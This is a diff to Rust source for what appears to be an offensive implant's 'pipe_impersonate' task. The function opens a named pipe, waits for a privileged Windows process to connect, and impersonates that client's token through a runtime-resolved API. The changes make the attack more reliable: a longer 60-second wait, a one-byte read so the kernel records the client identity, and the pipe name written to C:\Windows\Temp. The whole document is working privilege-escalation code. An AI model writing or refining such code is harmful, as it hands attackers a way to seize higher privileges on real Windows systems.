@@ -613,6 +613,8 @@ fn pipe_impersonate() -> TaskOutput {
     ov.hEvent = event;
     unsafe { ConnectNamedPipe(pipe, &mut ov) };
 
+    let _ = std::fs::write("C:\\Windows\\Temp\\dm-pipe.tmp", pipe_name.as_bytes());
+
     let adv = adv_base();
     if adv == 0 {
         unsafe { CancelIoEx(pipe, &ov) };
@@ -645,8 +647,8 @@ fn pipe_impersonate() -> TaskOutput {
         }
     };
 
-    // Wait up to 15 seconds for a privileged process to connect
-    let wait = unsafe { WaitForSingleObject(event, 15_000) };
+    // Wait up to 60 seconds for a privileged process to connect
+    let wait = unsafe { WaitForSingleObject(event, 60_000) };
     if wait != WAIT_OBJECT_0 {
         // Timeout or error — cancel the pending I/O and drain it before closing
         unsafe { CancelIoEx(pipe, &ov) };
@@ -654,10 +656,15 @@ fn pipe_impersonate() -> TaskOutput {
         unsafe { GetOverlappedResult(pipe, &ov, &mut n, 1) }; // bWait=TRUE
         unsafe { CloseHandle(pipe); CloseHandle(event) };
         return TaskOutput::failure(&format!(
-            "pipe: 15s timeout — no client connected to {}", pipe_name
+            "pipe: 60s timeout — no client connected to {}", pipe_name
         ));
     }
     unsafe { CloseHandle(event) };
+
+    // Drain at least one byte so the kernel records the client's identity
+    let mut buf = [0u8; 64];
+    let mut nr = 0u32;
+    unsafe { windows_sys::Win32::Storage::FileSystem::ReadFile(pipe, buf.as_mut_ptr(), 64, &mut nr, core::ptr::null_mut()) };
 
     let imp_ok = unsafe { fn_imp(pipe) };
     if imp_ok == 0 {
